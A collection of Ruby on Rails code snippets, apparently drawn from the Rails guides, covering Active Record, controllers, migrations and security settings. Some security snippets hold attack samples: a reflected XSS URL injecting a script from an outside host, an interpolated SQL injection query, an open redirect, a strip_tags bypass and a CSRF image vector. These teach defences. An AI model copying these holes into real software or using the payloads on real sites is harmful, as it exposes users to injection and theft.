TITLE: Using eager_load to Prevent N+1 Queries in Ruby on Rails
DESCRIPTION: This snippet demonstrates how to use Active Record's eager_load method to load associated records using a LEFT OUTER JOIN, reducing multiple queries to a single efficient query. It compares a scenario that would cause N+1 queries with an optimized approach.

LANGUAGE: ruby
CODE:
books = Book.eager_load(:author).limit(10)

books.each do |book|
  puts book.author.last_name
end

LANGUAGE: sql
CODE:
SELECT "books"."id" AS t0_r0, "books"."title" AS t0_r1, ... FROM "books"
  LEFT OUTER JOIN "authors" ON "authors"."id" = "books"."author_id"
  LIMIT 10

----------------------------------------

TITLE: Creating a Basic Table Migration in Ruby on Rails
DESCRIPTION: This migration creates a products table with name and description columns, plus implicit id and timestamp columns. Active Record automatically manages the created_at and updated_at timestamp fields.

LANGUAGE: ruby
CODE:
# db/migrate/20240502100843_create_products.rb
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products do |t|
      t.string :name
      t.text :description

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Vulnerable Redirection in Rails Legacy Action
DESCRIPTION: Example of a vulnerable redirection implementation in Rails that could be exploited for phishing attacks. This code passes parameters directly to redirect_to without proper validation, allowing attackers to redirect to malicious hosts.

LANGUAGE: ruby
CODE:
def legacy
  redirect_to(params.update(action: "main"))
end

----------------------------------------

TITLE: Creating a Basic Active Record Model Class in Ruby
DESCRIPTION: Shows how to create a Book model by inheriting from ApplicationRecord. This inheritance provides all the Active Record functionality for database interactions.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
end

----------------------------------------

TITLE: Configuring Content Security Policy in Rails Initializer
DESCRIPTION: This initializer configures a Content Security Policy (CSP) for a Rails application. It defines allowed sources for various resource types and sets up violation reporting to help protect against XSS and injection attacks.

LANGUAGE: ruby
CODE:
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Specify URI for violation reports
  policy.report_uri "/csp-violation-report-endpoint"
end

----------------------------------------

TITLE: Saving a Record to the Database in Rails
DESCRIPTION: Code to save a new Product instance to the database. Shows the SQL INSERT query that Rails generates to store the record.

LANGUAGE: irb
CODE:
store(dev)> product.save
  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/
  Product Create (0.9ms)  INSERT INTO "products" ("name", "created_at", "updated_at") VALUES ('T-Shirt', '2024-11-09 16:35:01.117836', '2024-11-09 16:35:01.117836') RETURNING "id" /*application='Store'*/
  TRANSACTION (0.9ms)  COMMIT TRANSACTION /*application='Store'*/
=> true

----------------------------------------

TITLE: Implementing CSRF Protection in a Rails Application Controller
DESCRIPTION: Code example showing how to enable CSRF protection in a Rails application controller. This adds security tokens to forms and verifies them on non-GET requests to prevent cross-site request forgery attacks.

LANGUAGE: ruby
CODE:
protect_from_forgery with: :exception

----------------------------------------

TITLE: Example of a Reflected XSS Attack URL
DESCRIPTION: A real-world example of a reflected XSS attack URL that injects malicious content into a CBS News page. This demonstrates how search parameters and other URL components can be exploited for XSS attacks.

LANGUAGE: html
CODE:
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--

----------------------------------------

TITLE: Vulnerable SQL Query with String Interpolation
DESCRIPTION: Demonstrates a SQL injection vulnerability by directly interpolating user input into a database query string without proper sanitization.

LANGUAGE: ruby
CODE:
Project.where("name = '#{params[:name]}'")

----------------------------------------

TITLE: Using a Custom Form Helper
DESCRIPTION: Shows how to use a custom form helper method defined in ApplicationHelper within a form_with block. This example uses the text_field_with_label helper to generate both a label and text field for a model attribute.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |form| %>
  <%= text_field_with_label form, :first_name %>
<% end %>

----------------------------------------

TITLE: Filtering Errors with errors.where Method
DESCRIPTION: This code demonstrates how to filter validation errors using the errors.where method. It shows how to filter errors by attribute, error type, and specific validation options.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.valid?
=> false

irb> person.errors.where(:name)
=> [ ... ] # all errors for :name attribute

irb> person.errors.where(:name, :too_short)
=> [ ... ] # :too_short errors for :name attribute

----------------------------------------

TITLE: Implementing CSRF Protection in Rails Controllers
DESCRIPTION: This snippet shows how to implement Cross-Site Request Forgery (CSRF) protection in a Rails application controller. The protect_from_forgery method with :exception option ensures that the application will raise an InvalidAuthenticityToken error on unverified requests.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception
end

----------------------------------------

TITLE: Handling Complex Nested Parameters in Rails
DESCRIPTION: This comprehensive example demonstrates how to use expect to handle complex nested parameters including arrays of objects with their own nested structures. It shows the proper syntax for permitting deeply nested data structures.

LANGUAGE: ruby
CODE:
# Given the example expected params:
params = ActionController::Parameters.new(
  name: "Martin",
  emails: ["me@example.com"],
  friends: [
    { name: "AndrÃ©", family: { name: "RubyGems" }, hobbies: ["keyboards", "card games"] },
    { name: "Kewe", family: { name: "Baroness" }, hobbies: ["video games"] },
  ]
)
# the following expect will ensure the params are permitted
name, emails, friends = params.expect(
  :name,                 # permitted scalar
  emails: [],            # array of permitted scalars
  friends: [[            # array of permitted Parameter hashes
    :name,               # permitted scalar
    family: [:name],     # family: { name: "permitted scalar" }
    hobbies: []          # array of permitted scalars
  ]]
)

----------------------------------------

TITLE: Using Conditionals in Rails Scopes
DESCRIPTION: This snippet demonstrates how to incorporate conditionals in scope definitions. It highlights the key difference between scopes and class methods: scopes always return an ActiveRecord::Relation, even when conditionals evaluate to false.

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  scope :created_before, ->(time) { where(created_at: ...time) if time.present? }
end

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  def self.created_before(time)
    where(created_at: ...time) if time.present?
  end
end

----------------------------------------

TITLE: Basic Job Class Structure in Ruby on Rails
DESCRIPTION: Shows the standard structure of a job class in Rails, which inherits from ApplicationJob and defines a perform method that contains the job's logic.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  queue_as :default

  def perform(*guests)
    # Do something later
  end
end

----------------------------------------

TITLE: Creating a Basic Controller in Rails
DESCRIPTION: A simple example of creating a controller class that inherits from ApplicationController. This snippet demonstrates the basic structure of a Rails controller with an empty action method.

LANGUAGE: ruby
CODE:
class ClientsController < ApplicationController
  def new
  end
end

----------------------------------------

TITLE: Creating a New Rails Application
DESCRIPTION: Command to generate a new Rails application named 'store'. This creates the foundation of a fresh Rails application with all necessary directories and files.

LANGUAGE: bash
CODE:
$ rails new store

----------------------------------------

TITLE: Secure Content Sanitization in Rails
DESCRIPTION: A secure implementation using Rails' sanitize() method with a permitted list approach. This code explicitly defines allowed HTML tags and attributes, which is more effective against XSS attacks than restricted lists.

LANGUAGE: ruby
CODE:
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))

----------------------------------------

TITLE: Enhanced Session Expiry with Creation Time Check in Rails
DESCRIPTION: An improved session sweeping method that deletes sessions based on both last activity time and creation time. This prevents session fixation attacks by ensuring sessions can't be maintained indefinitely through regular activity.

LANGUAGE: ruby
CODE:
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all

----------------------------------------

TITLE: Implementing Model Validations in Rails
DESCRIPTION: Defines a presence validation for the Product model to ensure that all products must have a name attribute. This validation will run automatically during create, update, and save operations.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  validates :name, presence: true
end

----------------------------------------

TITLE: Adding Create Action with Strong Parameters to ProductsController in Rails
DESCRIPTION: Implements the create action to handle form submissions with strong parameters for security. Includes validation handling and conditional redirection based on save success.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
    @products = Product.all
  end

  def show
    @product = Product.find(params[:id])
  end

  def new
    @product = Product.new
  end

  def create
    @product = Product.new(product_params)
    if @product.save
      redirect_to @product
    else
      render :new, status: :unprocessable_entity
    end
  end

  private
    def product_params
      params.expect(product: [ :name ])
    end
end

----------------------------------------

TITLE: Forcing SSL Connection in Rails Configuration
DESCRIPTION: Code snippet showing how to force SSL connections in Rails 3.1+ by setting the force_ssl configuration option to true. This prevents session hijacking through network sniffing by ensuring all communications are encrypted.

LANGUAGE: ruby
CODE:
config.force_ssl = true

----------------------------------------

TITLE: Implementing Basic ProductsController with Index, Show, and New Actions in Ruby on Rails
DESCRIPTION: Initial implementation of the ProductsController with three actions: index to display all products, show to display a specific product, and new to instantiate a new Product for a form.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
    @products = Product.all
  end

  def show
    @product = Product.find(params[:id])
  end

  def new
    @product = Product.new
  end
end

----------------------------------------

TITLE: Implementing Optimistic Locking in ActiveRecord
DESCRIPTION: Demonstrates how optimistic locking works in ActiveRecord to prevent race conditions by tracking a lock_version column and raising an exception when conflicts are detected.

LANGUAGE: ruby
CODE:
c1 = Customer.find(1)
c2 = Customer.find(1)

c1.first_name = "Sandra"
c1.save

c2.first_name = "Michael"
c2.save # Raises an ActiveRecord::StaleObjectError

LANGUAGE: ruby
CODE:
class Customer < ApplicationRecord
  self.locking_column = :lock_customer_column
end

----------------------------------------

TITLE: Method Chaining with ActiveRecord in Ruby
DESCRIPTION: Demonstrates how to use method chaining with ActiveRecord to build complex queries. Examples show retrieving filtered data from multiple tables with joins and custom selections.

LANGUAGE: ruby
CODE:
Customer
  .select("customers.id, customers.last_name, reviews.body")
  .joins(:reviews)
  .where("reviews.created_at > ?", 1.week.ago)

LANGUAGE: ruby
CODE:
Book
  .select("books.id, books.title, authors.first_name")
  .joins(:author)
  .find_by(title: "Abstraction and Specification in Program Development")

----------------------------------------

TITLE: Defining a Simple Presence Validation in Rails
DESCRIPTION: Example of a simple Rails model class with a presence validation on the name attribute. This demonstrates the basic syntax for adding validations to an Active Record model.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, presence: true
end

----------------------------------------

TITLE: Creating a New Product Form with form_with in Rails ERB
DESCRIPTION: Implements a form for creating new products using Rails form_with helper, which generates an HTML form with CSRF protection and proper routes based on the model.

LANGUAGE: erb
CODE:
<h1>New product</h1>

<%= form_with model: @product do |form| %>
  <div>
    <%= form.label :name %>
    <%= form.text_field :name %>
  </div>

  <div>
    <%= form.submit %>
  </div>
<% end %>

----------------------------------------

TITLE: Finding or Creating Records with ActiveRecord in Ruby
DESCRIPTION: Covers methods for finding records or creating them if they don't exist using find_or_create_by, find_or_create_by!, and find_or_initialize_by. Includes examples with conditional attribute setting.

LANGUAGE: ruby
CODE:
irb> Customer.find_or_create_by(first_name: 'Andy')
=> #<Customer id: 5, first_name: "Andy", last_name: nil, title: nil, visits: 0, orders_count: nil, lock_version: 0, created_at: "2019-01-17 07:06:45", updated_at: "2019-01-17 07:06:45">

LANGUAGE: ruby
CODE:
Customer.create_with(locked: false).find_or_create_by(first_name: "Andy")

LANGUAGE: ruby
CODE:
Customer.find_or_create_by(first_name: "Andy") do |c|
  c.locked = false
end

LANGUAGE: ruby
CODE:
irb> Customer.find_or_create_by!(first_name: 'Andy')
ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank

LANGUAGE: ruby
CODE:
irb> nina = Customer.find_or_initialize_by(first_name: 'Nina')
=> #<Customer id: nil, first_name: "Nina", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">

irb> nina.persisted?
=> false

irb> nina.new_record?
=> true

LANGUAGE: ruby
CODE:
irb> nina.save
=> true

----------------------------------------

TITLE: Updating Strong Parameters for File Upload in Rails Controller
DESCRIPTION: Shows how to update the product_params method in the ProductsController to permit the featured_image parameter for file uploads with Active Storage.

LANGUAGE: ruby
CODE:
    # Only allow a list of trusted parameters through.
    def product_params
      params.expect(product: [ :name, :description, :featured_image ])
    end

----------------------------------------

TITLE: Overriding Content Security Policy in a Rails Controller
DESCRIPTION: This example shows how to override the global Content Security Policy for specific controller actions. It adds upgrade_insecure_requests and sets a specific base_uri for enhanced security.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end

----------------------------------------

TITLE: Basic Active Record Queries in Rails
DESCRIPTION: Shows basic methods for retrieving records: all to fetch all records, first for the first record, last for the last record, and take for any single record.

LANGUAGE: ruby
CODE:
# Return a collection with all books.
books = Book.all

# Return a single book.
first_book = Book.first
last_book = Book.last
book = Book.take

----------------------------------------

TITLE: Bulk Updating Records in Rails
DESCRIPTION: Demonstrates how to update multiple records at once using the update_all method, which bypasses Active Record callbacks and validations for better performance when updating many records.

LANGUAGE: ruby
CODE:
Book.update_all(status: "already own")

----------------------------------------

TITLE: Custom Block-Based Attribute Validation with validates_each
DESCRIPTION: This snippet shows how to create custom validations using a block. The example rejects names and surnames that begin with lowercase letters, adding a custom error message when validation fails.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates_each :name, :surname do |record, attr, value|
    record.errors.add(attr, "must start with upper case") if /\A[[:lower:]]/.match?(value)
  end
end

----------------------------------------

TITLE: Refactoring ProductsController with before_action in Rails
DESCRIPTION: Improves the controller by using a before_action callback to extract the common product lookup logic from show, edit, and update actions, demonstrating the DRY principle.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  before_action :set_product, only: %i[ show edit update ]

  def index
    @products = Product.all
  end

  def show
  end

  def new
    @product = Product.new
  end

  def create
    @product = Product.new(product_params)
    if @product.save
      redirect_to @product
    else
      render :new, status: :unprocessable_entity
    end
  end

  def edit
  end

  def update
    if @product.update(product_params)
      redirect_to @product
    else
      render :edit, status: :unprocessable_entity
    end
  end

  private
    def set_product
      @product = Product.find(params[:id])
    end

    def product_params
      params.expect(product: [ :name ])
    end
end

----------------------------------------

TITLE: Secure File Download Implementation in Ruby
DESCRIPTION: This code demonstrates a secure approach to downloading files by validating that the requested file is within the expected directory. It prevents path traversal attacks by checking that the expanded file path is within the permitted directory.

LANGUAGE: ruby
CODE:
basename = File.expand_path("../../files", __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: "inline"

----------------------------------------

TITLE: Defining a Model with Various Validators in Rails
DESCRIPTION: Demonstrates a model definition with multiple validators including built-in validators and a custom validator. This shows the different ways validation can be applied to a model.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, presence: true, on: :create
  validates :email, format: URI::MailTo::EMAIL_REGEXP
  validates_with MyOtherValidator, strict: true
end

----------------------------------------

TITLE: User Model with Secure Password
DESCRIPTION: User model implementation with has_secure_password method which handles password hashing using bcrypt. It also normalizes email addresses for consistent comparison.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_secure_password
  has_many :sessions, dependent: :destroy

  normalizes :email_address, with: -> e { e.strip.downcase }
end

----------------------------------------

TITLE: Bypassing Restricted List Filtering in Ruby
DESCRIPTION: An example showing how older versions of Rails' restricted list filtering approach in strip_tags() could be bypassed by malicious input. This demonstrates why permitted list filtering is preferred for security.

LANGUAGE: ruby
CODE:
strip_tags("some<<b>script>alert('hello')<</b>/script>")

----------------------------------------

TITLE: Starting Rails Console
DESCRIPTION: Command to launch the interactive Rails console for testing code in a Rails application. This provides a REPL environment with access to the application's models and database.

LANGUAGE: bash
CODE:
$ bin/rails console

----------------------------------------

TITLE: Using Strong Parameters in Rails Controllers
DESCRIPTION: This example demonstrates the implementation of Strong Parameters in a Rails controller. It shows how to properly handle mass assignment by using a private method to define permitted parameters, preventing unauthorized attribute updates.

LANGUAGE: ruby
CODE:
class PeopleController < ActionController::Base
  # This will raise an ActiveModel::ForbiddenAttributesError
  # because it's using mass assignment without an explicit permit.
  def create
    Person.create(params[:person])
  end

  # This will work as we are using `person_params` helper method, which has the
  # call to `expect` to allow mass assignment.
  def update
    person = Person.find(params[:id])
    person.update!(person_params)
    redirect_to person
  end

  private
    # Using a private method to encapsulate the permitted parameters is a good
    # pattern. You can use the same list for both create and update.
    def person_params
      params.expect(person: [:name, :age])
    end
end

----------------------------------------

TITLE: Implementing Full Text Search in PostgreSQL with Rails
DESCRIPTION: Shows two approaches to implementing full text search in PostgreSQL: using a functional index and using a stored generated column for better performance.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_documents.rb
create_table :documents do |t|
  t.string :title
  t.string :body
end

add_index :documents, "to_tsvector('english', title || ' ' || body)", using: :gin, name: "documents_idx"

LANGUAGE: ruby
CODE:
# app/models/document.rb
class Document < ApplicationRecord
end

LANGUAGE: ruby
CODE:
# Usage
Document.create(title: "Cats and Dogs", body: "are nice!")

## all documents matching 'cat & dog'
Document.where("to_tsvector('english', title || ' ' || body) @@ to_tsquery(?)",
                 "cat & dog")

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_documents.rb
create_table :documents do |t|
  t.string :title
  t.string :body

  t.virtual :textsearchable_index_col,
            type: :tsvector, as: "to_tsvector('english', title || ' ' || body)", stored: true
end

add_index :documents, :textsearchable_index_col, using: :gin, name: "documents_idx"

# Usage
Document.create(title: "Cats and Dogs", body: "are nice!")

## all documents matching 'cat & dog'
Document.where("textsearchable_index_col @@ to_tsquery(?)", "cat & dog")

----------------------------------------

TITLE: Using Dynamic Values in Content Security Policy with Lambdas
DESCRIPTION: This example shows how to use lambdas to inject dynamic values into a Content Security Policy, such as account-specific subdomains in a multi-tenant application based on the current user.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end

----------------------------------------

TITLE: JavaScript to Extract CSRF Token from Meta Tags
DESCRIPTION: JavaScript code to retrieve the CSRF token from meta tags in the document head. This can be used to include the token in custom AJAX requests for proper authentication with Rails' CSRF protection.

LANGUAGE: javascript
CODE:
document.head.querySelector("meta[name=csrf-token]")?.content

----------------------------------------

TITLE: Using Scoped Uniqueness Validation in Rails
DESCRIPTION: This snippet shows how to limit uniqueness validation to a specific scope. The validation ensures that a name is unique for each year, preventing duplicate holiday names within the same year.

LANGUAGE: ruby
CODE:
class Holiday < ApplicationRecord
  validates :name, uniqueness: { scope: :year,
    message: "should happen once per year" }
end

----------------------------------------

TITLE: Secure Parameterized Query with Positional Placeholders
DESCRIPTION: Shows the proper way to sanitize user input in SQL queries using positional placeholders (question marks) to prevent SQL injection.

LANGUAGE: ruby
CODE:
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first

----------------------------------------

TITLE: Enabling HTTPS with Strict Transport Security Header
DESCRIPTION: This configuration enables the force_ssl option in Rails, which automatically adds the Strict-Transport-Security header to responses and ensures all connections use HTTPS.

LANGUAGE: ruby
CODE:
config.force_ssl = true

----------------------------------------

TITLE: Configuring Content Security Policy Violation Reporting
DESCRIPTION: This configuration enables the report-uri directive in the Content Security Policy to report violations to a specified endpoint without blocking content, useful for monitoring and debugging CSP issues.

LANGUAGE: ruby
CODE:
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end

----------------------------------------

TITLE: Handling Invalid CSRF Tokens in Rails Application Controller
DESCRIPTION: Example of a rescue_from handler that manages invalid CSRF token exceptions. This method clears user cookies when an invalid token is detected, preventing the continuation of a potentially compromised session.

LANGUAGE: ruby
CODE:
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Example method that will destroy the user cookies
end

----------------------------------------

TITLE: Implementing Rate Limiting in Rails Sessions Controller
DESCRIPTION: This code shows how to implement rate limiting in a Rails sessions controller to protect against brute-force login attempts. It uses Rails' built-in rate-limiter to limit login attempts to 10 within a 3-minute period.

LANGUAGE: ruby
CODE:
class SessionsController < ApplicationController
  rate_limit to: 10, within: 3.minutes, only: :create
end

----------------------------------------

TITLE: Using EXPLAIN with Options in PostgreSQL
DESCRIPTION: Demonstrates how to use the explain method with analyze and verbose options in PostgreSQL to get detailed query execution information. This helps in understanding how the database processes joins and where conditions.

LANGUAGE: ruby
CODE:
Customer.where(id: 1).joins(:orders).explain(:analyze, :verbose)

LANGUAGE: sql
CODE:
EXPLAIN (ANALYZE, VERBOSE) SELECT "shop_accounts".* FROM "shop_accounts" INNER JOIN "customers" ON "customers"."id" = "shop_accounts"."customer_id" WHERE "shop_accounts"."id" = $1 [["id", 1]]
                                                                   QUERY PLAN
------------------------------------------------------------------------------------------------------------------------------------------------
 Nested Loop  (cost=0.30..16.37 rows=1 width=24) (actual time=0.003..0.004 rows=0 loops=1)
   Output: shop_accounts.id, shop_accounts.customer_id, shop_accounts.customer_carrier_id
   Inner Unique: true
   ->  Index Scan using shop_accounts_pkey on public.shop_accounts  (cost=0.15..8.17 rows=1 width=24) (actual time=0.003..0.003 rows=0 loops=1)
         Output: shop_accounts.id, shop_accounts.customer_id, shop_accounts.customer_carrier_id
         Index Cond: (shop_accounts.id = '1'::bigint)
   ->  Index Only Scan using customers_pkey on public.customers  (cost=0.15..8.17 rows=1 width=8) (never executed)
         Output: customers.id
         Index Cond: (customers.id = shop_accounts.customer_id)
         Heap Fetches: 0
 Planning Time: 0.063 ms
 Execution Time: 0.011 ms
(12 rows)

----------------------------------------

TITLE: Adding CSP Nonce Meta Tag in HTML Head
DESCRIPTION: This ERB snippet demonstrates how to include the csp_meta_tag helper in the HTML head section, which creates a meta tag with the current CSP nonce value for use by Rails UJS when creating dynamic inline scripts.

LANGUAGE: ruby
CODE:
<head>
  <%= csp_meta_tag %>
</head>

----------------------------------------

TITLE: Configuring Connection Authentication in Ruby on Rails Action Cable
DESCRIPTION: Sets up user authentication for WebSocket connections using encrypted cookies. The connection identifies users by their ID and rejects unauthorized connections. This is the foundation for authenticating real-time connections in Action Cable.

LANGUAGE: ruby
CODE:
# app/channels/application_cable/connection.rb
module ApplicationCable
  class Connection < ActionCable::Connection::Base
    identified_by :current_user

    def connect
      self.current_user = find_verified_user
    end

    private
      def find_verified_user
        if verified_user = User.find_by(id: cookies.encrypted[:user_id])
          verified_user
        else
          reject_unauthorized_connection
        end
      end
  end
end

----------------------------------------

TITLE: Handling Conflicts When Generating Namespaced Models
DESCRIPTION: Example showing the command output when generating a namespaced model where the parent module already exists, prompting for conflict resolution.

LANGUAGE: bash
CODE:
$ bin/rails generate model Book::Order
      invoke  active_record
      create    db/migrate/20240305140356_create_book_orders.rb
      create    app/models/book/order.rb
    conflict    app/models/book.rb
  Overwrite /Users/bhumi/Code/rails_guides/app/models/book.rb? (enter "h" for help) [Ynaqdhm]

----------------------------------------

TITLE: Demonstrating the N+1 Query Problem in Rails
DESCRIPTION: Illustrates the N+1 query problem that occurs when accessing associated records in a loop. This inefficient code executes 11 queries (1 for books + 10 for authors) instead of optimally using just 2 queries.

LANGUAGE: ruby
CODE:
books = Book.limit(10)

books.each do |book|
  puts book.author.last_name
end

----------------------------------------

TITLE: Defining Model Validations in Rails
DESCRIPTION: Example of defining validations in a User model to ensure the name attribute is present before saving to the database. This prevents invalid data from being persisted.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :name, presence: true
end

----------------------------------------

TITLE: Generating Rails Authentication System
DESCRIPTION: Command to generate Rails authentication system with User and Session models. This creates necessary controllers and views for login functionality.

LANGUAGE: bash
CODE:
$ bin/rails generate authentication

----------------------------------------

TITLE: Resetting Session to Prevent Session Fixation
DESCRIPTION: Simple but effective code snippet that resets the session to generate a new session identifier, which protects against session fixation attacks. This should be implemented after successful authentication.

LANGUAGE: ruby
CODE:
reset_session

----------------------------------------

TITLE: CSRF Attack Using Image Onmouseover Event
DESCRIPTION: Demonstration of a CSRF attack vector using the onmouseover event of an HTML image element. This snippet shows how an attacker can trigger malicious actions when a user interacts with seemingly harmless page elements.

LANGUAGE: html
CODE:
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />

----------------------------------------

TITLE: Implementing Secure Password in a Ruby Class with ActiveModel
DESCRIPTION: Shows how to include ActiveModel::SecurePassword and implement has_secure_password with both a primary password and a recovery password. The recovery password has validations disabled.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::SecurePassword

  has_secure_password
  has_secure_password :recovery_password, validations: false

  attr_accessor :password_digest, :recovery_password_digest
end

----------------------------------------

TITLE: Handling errors in ActionMailer with rescue_from
DESCRIPTION: Demonstrates using rescue_from in mailers to handle errors that occur during the email delivery process, including background job deserialization errors and third-party service errors.

LANGUAGE: ruby
CODE:
class NotifierMailer < ApplicationMailer
  rescue_from ActiveJob::DeserializationError do
    # ...
  end

  rescue_from "SomeThirdPartyService::ApiError" do
    # ...
  end

  def notify(recipient)
    mail(to: recipient, subject: "Notification")
  end
end

----------------------------------------

TITLE: Implementing User Authentication with Sessions in Rails
DESCRIPTION: Shows how to implement a current_user method using session data. This private method in ApplicationController looks up a user based on the current_user_id stored in the session.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  private
    # Look up the key `:current_user_id` in the session and use it to
    # find the current `User`. This is a common way to handle user login in
    # a Rails application; logging in sets the session value and
    # logging out removes it.
    def current_user
      @current_user ||= User.find_by(id: session[:current_user_id]) if session[:current_user_id]
    end
end

----------------------------------------

TITLE: Joining Nested Associations (Multiple Level) in ActiveRecord
DESCRIPTION: Shows complex joining of deeply nested associations. This query traverses from authors to books to reviews to customers to orders, and also joins books with suppliers, to find authors whose books have reviews from customers with orders.

LANGUAGE: ruby
CODE:
Author.joins(books: [{ reviews: { customer: :orders } }, :supplier])

LANGUAGE: sql
CODE:
SELECT authors.* FROM authors
  INNER JOIN books ON books.author_id = authors.id
  INNER JOIN reviews ON reviews.book_id = books.id
  INNER JOIN customers ON customers.id = reviews.customer_id
  INNER JOIN orders ON orders.customer_id = customers.id
INNER JOIN suppliers ON suppliers.id = books.supplier_id

----------------------------------------

TITLE: Setting Up Timestamps with Time Zone Support in Rails
DESCRIPTION: Demonstrates how to set up timestamp columns in Rails and configure them to use 'timestamp with time zone' data type following PostgreSQL best practices.

LANGUAGE: ruby
CODE:
# db/migrate/20241220144913_create_devices.rb
create_table :post, id: :uuid do |t|
  t.datetime :published_at
  # By default, Active Record will set the data type of this column to `timestamp without time zone`.
end

LANGUAGE: ruby
CODE:
# config/application.rb
ActiveSupport.on_load(:active_record_postgresqladapter) do
  self.datetime_type = :timestamptz
end

----------------------------------------

TITLE: Starting a Rails Server with bin/rails server
DESCRIPTION: Demonstrates how to start the Rails development server using the bin/rails server command. This launches Puma web server and makes the application accessible through a web browser on port 3000 by default.

LANGUAGE: bash
CODE:
$ cd my_app
$ bin/rails server
=> Booting Puma
=> Rails 8.1.0 application starting in development
=> Run `bin/rails server --help` for more startup options
Puma starting in single mode...
* Puma version: 6.4.0 (ruby 3.1.3-p185) ("The Eagle of Durango")
*  Min threads: 5
*  Max threads: 5
*  Environment: development
*          PID: 5295
* Listening on http://127.0.0.1:3000
* Listening on http://[::1]:3000
Use Ctrl-C to stop

----------------------------------------

TITLE: Configuring Host Authorization in Rails to Prevent DNS Rebinding Attacks
DESCRIPTION: Example of how to configure ActionDispatch::HostAuthorization middleware in Rails to protect against DNS rebinding and Host header attacks by specifying allowed hosts and exceptions.

LANGUAGE: ruby
CODE:
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # Exclude requests for the /healthcheck/ path from host checking
  exclude: ->(request) { request.path.include?("healthcheck") },
  # Add custom Rack application for the response
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}

----------------------------------------

TITLE: Singular Resource Definition with Resolution
DESCRIPTION: Demonstrates how to define a singular resource (geocoder) with record identification resolution for converting instances to routes.

LANGUAGE: ruby
CODE:
resource :geocoder
resolve("Geocoder") { [:geocoder] }

----------------------------------------

TITLE: Creating Indexes with Included Columns in PostgreSQL
DESCRIPTION: Demonstrates how to create indexes with included columns in PostgreSQL, which allows non-key columns to be stored in the index for faster index-only scans.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_add_index_users_on_email_include_id.rb

add_index :users, :email, include: :id

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_add_index_users_on_email_include_id_and_created_at.rb

add_index :users, :email, include: [:id, :created_at]

----------------------------------------

TITLE: Implementing PostgreSQL Enumerated Types in Rails
DESCRIPTION: Demonstrates creating and using PostgreSQL enum types for columns with a fixed set of values. Includes migrations for creating/modifying enums and shows how to integrate with ActiveRecord::Enum for type safety and helper methods.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_articles.rb
def change
  create_enum :article_status, ["draft", "published", "archived"]

  create_table :articles do |t|
    t.enum :status, enum_type: :article_status, default: "draft", null: false
  end
end

LANGUAGE: ruby
CODE:
# db/migrate/20230113024409_add_status_to_articles.rb
def change
  create_enum :article_status, ["draft", "published", "archived"]

  add_column :articles, :status, :enum, enum_type: :article_status, default: "draft", null: false
end

LANGUAGE: ruby
CODE:
def down
  drop_table :articles

  # OR: remove_column :articles, :status
  drop_enum :article_status
end

LANGUAGE: ruby
CODE:
# app/models/article.rb
class Article < ApplicationRecord
  enum :status, {
    draft: "draft", published: "published", archived: "archived"
  }, prefix: true
end

LANGUAGE: ruby
CODE:
irb> article = Article.create
irb> article.status
=> "draft" # default status from PostgreSQL, as defined in migration above

irb> article.status_published!
irb> article.status
=> "published"

irb> article.status_archived?
=> false

irb> article.status = "deleted"
ArgumentError: 'deleted' is not a valid status

LANGUAGE: ruby
CODE:
# db/migrate/20150718144917_rename_article_status.rb
def change
  rename_enum :article_status, :article_state
end

LANGUAGE: ruby
CODE:
# db/migrate/20150720144913_add_new_state_to_articles.rb
def up
  add_enum_value :article_state, "archived" # will be at the end after published
  add_enum_value :article_state, "in review", before: "published"
